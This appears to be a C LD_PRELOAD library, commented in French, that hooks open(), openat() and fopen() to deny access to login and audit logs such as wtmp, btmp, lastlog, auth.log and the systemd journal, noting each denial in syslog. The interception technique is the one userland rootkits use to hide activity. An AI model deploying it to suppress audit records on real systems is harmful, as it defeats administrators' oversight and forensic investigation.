#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <stdarg.h>

// Liste des fichiers ou motifs à bloquer
static const char *BLOCKED_PATTERNS[] = {
    "/var/log/wtmp",
    "/var/log/lastlog",
    "/var/log/btmp",
    "/var/log/sysstat",
    "/var/log/journal",
    "Xorg.",             // Bloque tout fichier contenant "Xorg." dans son chemin
    "/var/log/auth.log",
    NULL                // Fin de la liste
};

// Vérifie si le chemin d'accès correspond à un fichier/motif bloqué
static int is_blocked_path(const char *path) {
    if (!path) return 0;
    
    for (int i = 0; BLOCKED_PATTERNS[i] != NULL; i++) {
        // strstr() renvoie un pointeur non nul si BLOCKED_PATTERNS[i] apparaît dans path
        if (strstr(path, BLOCKED_PATTERNS[i])) {
            // Log minimal pour signaler l'accès bloqué
            syslog(LOG_WARNING, "[BLOCK] Accès refusé à : %s (UID: %d)", path, getuid());
            return 1;
        }
    }
    return 0;
}

// --------------------- Intercepteur pour open() ---------------------
int open(const char *pathname, int flags, ...) {
    static int (*real_open)(const char*, int, mode_t) = NULL;
    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
    }

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) {
        mode = va_arg(args, mode_t);
    }
    va_end(args);

    return real_open(pathname, flags, mode);
}

// --------------------- Intercepteur pour openat() ---------------------
int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*real_openat)(int, const char*, int, mode_t) = NULL;
    if (!real_openat) {
        real_openat = dlsym(RTLD_NEXT, "openat");
    }

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) {
        mode = va_arg(args, mode_t);
    }
    va_end(args);

    return real_openat(dirfd, pathname, flags, mode);
}

// --------------------- Intercepteur pour fopen() ---------------------
FILE *fopen(const char *pathname, const char *mode) {
    static FILE* (*real_fopen)(const char*, const char*) = NULL;
    if (!real_fopen) {
        real_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return NULL;
    }

    return real_fopen(pathname, mode);
}

